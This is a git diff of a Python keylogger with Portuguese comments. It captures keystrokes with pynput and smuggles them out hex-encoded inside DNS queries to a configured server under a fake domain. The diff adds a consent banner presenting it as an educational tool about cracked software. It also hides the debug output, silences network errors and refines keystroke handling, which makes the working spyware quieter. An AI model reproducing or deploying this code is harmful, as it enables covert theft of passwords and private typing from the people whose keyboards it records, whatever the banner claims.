@@ -3,6 +3,7 @@
 ###############################################################
 import socket
 import random
+import sys, os, time
 from pynput import keyboard
 from dnslib import DNSRecord
 
@@ -14,16 +15,61 @@ from dnslib import DNSRecord
 # _NAME = 'licence.dll'
 
 # Futuramente podemos passar essas VARs global
-# Para dentro do code, está aqui apenas para
+# Para dentro das funções, está aqui apenas para
 # facilitar as alterações
 _DNS_ADDR = ('127.0.0.1', 9953)
-_FAKE_DOMAIN = '.example.com'
+_FAKE_DOMAIN = '.fake-domain.com.'
 _KEYS = []
 _USR_HAS = None
+_COR = {
+        'limpa':'\033[m',
+        'red':'\033[31m',
+        'green':'\033[32m',
+        'yellow':'\033[33m'
+    }
 
 ###############################################################
 # Classes e Funções
 ###############################################################
+def limpar_tela():
+    if 'linux' in sys.platform:
+        os.system('clear')
+    elif 'win' in sys.platform:
+        os.system('cls')
+
+def alert_run():
+    limpar_tela()
+    print(f'''
+    {_COR['red']}
+    ╦╔═┌─┐┬ ┬┬  ┌─┐┌─┐┌─┐┌─┐┬─┐
+    ╠╩╗├┤ └┬┘│  │ ││ ┬│ ┬├┤ ├┬┘
+    ╩ ╩└─┘ ┴ ┴─┘└─┘└─┘└─┘└─┘┴└─
+    ╔═╗┬  ┌─┐┬─┐┌┬┐            
+    ╠═╣│  ├┤ ├┬┘ │             
+    ╩ ╩┴─┘└─┘┴└─ ┴             
+    ########################### ALERTA #################################
+    # Esta ferramenta é destinada exclusivamente para fins educativos  #
+    # e de conscientização sobre os perigos do utilizar soluções não   #
+    # licenciadas (crackeadas). O uso desta ferramenta em ambientes    #
+    # não autorizados ou para atividades maliciosas é estritamente:    #
+    #                          >>> PROIBIDO <<<                        #
+    ####################################################################
+    # Ao executar esta ferramenta, você dará acesso irrestrito ao      #
+    # "outro lado" aos eventos de Input/Output do seu sistema op.      #
+    # Se você não está em um ambiente controlado ou não sabe do que    #
+    # esse software se trata, por gentileza NÃO O EXECUTE.             #
+    ########################### ALERTA #################################''')
+    consentimento = input(f'''{_COR['limpa']}Concorda? (sim ou nao)> {_COR['limpa']}''')
+
+    if consentimento == 'sim':
+        print(f'''{_COR['yellow']}Carregando...{_COR['limpa']}''')
+        time.sleep(1)
+        limpar_tela()
+        print('Keylogger executando... \n Precione "ESC" para fecha-lo!')
+        pass
+    else:
+        sys.exit()
+
 def hash_adler32(data):
     a = 1
     size = len(data)
@@ -67,33 +113,26 @@ def send_data(data):
         domain = DNSRecord.question(request)
 
         # Envia a requisição DNS para o servidor
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(5.0)
-
         try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(3.0)
             sock.sendto(domain.pack(), _DNS_ADDR)
-        except:
-            print('Erro ao enviar!')
-
-        try:
-            # Recebendo resposta falsa do DNS
             _ = sock.recvfrom(512)
-        except socket.timeout:
-            print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
+        except:
             pass
-
 
 def on_release(key):
     global _KEYS, _USR_HAS
 
     # Verifico se já está no tamanho de mandar o pacote DNS
+    # 31 pois temos que converter para Hex, totalizando 62
     if len(_KEYS) >= (31 - len(_USR_HAS)):
         for ch in _USR_HAS:
             _KEYS.insert(0, ch)
         send_data(_KEYS)
         _KEYS = []
 
-    # Condição de parada (podemos remover depois...)
+    # Condição de parada
     if key == keyboard.Key.esc:
         return False
     
@@ -101,7 +140,7 @@ def on_release(key):
     try:
         if key.char != None:
             _KEYS.append(key.char) # ord()
-            print(key.char)
+            # print(key.char)
 
         else:
             if '<96>' == str(key):
@@ -126,22 +165,28 @@ def on_release(key):
                 _KEYS.append('9')
                 
             # todo o resto que não tratei
-            else:
-                print(f'Não consegui identificar: {key}')
+            # else:
+                # print(f'Não consegui identificar: {key}')
 
     # Trato se for algum caractere especial
     except AttributeError:
-
-        if str(key)          == 'Key.space':
+        if str(key) == 'Key.space' or \
+            str(key) == 'Key.enter' or \
+            str(key) == 'Key.tab':
             _KEYS.append(' ')
 
-        else:
-            print(f'Não tenho tratamento para isso: {key}')
+        elif str(key) == 'Key.backspace':
+            if _KEYS:
+                _KEYS.pop(-1)
+
+        # else:
+            # print(f'Não tenho tratamento para isso: {key}')
 
 ###############################################################
 # Main
 ###############################################################
 if __name__ == "__main__":
+    alert_run()
     # Gerando nome aleatório
     _USR_HAS = [char for char in hash_adler32(str(random.randint(100, 999)))]
 
